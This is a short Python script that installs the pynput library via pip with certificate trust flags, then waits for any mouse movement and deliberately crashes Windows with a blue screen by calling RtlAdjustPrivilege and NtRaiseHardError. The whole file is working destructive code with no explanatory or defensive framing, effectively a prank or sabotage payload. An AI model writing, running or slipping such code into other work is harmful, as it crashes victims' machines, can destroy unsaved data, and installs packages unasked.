import os

try:
    os.system("python -m pip install -U --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org pynput")
except:
    print("Failed")
    exit()

import ctypes
from pynput import mouse

def on_move(x, y):
    print("Mouse moved,  bye bye")
    bluescreen()
    
def bluescreen():
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")
        exit()
        
with mouse.Listener(
        on_move=on_move) as listener:
    listener.join()
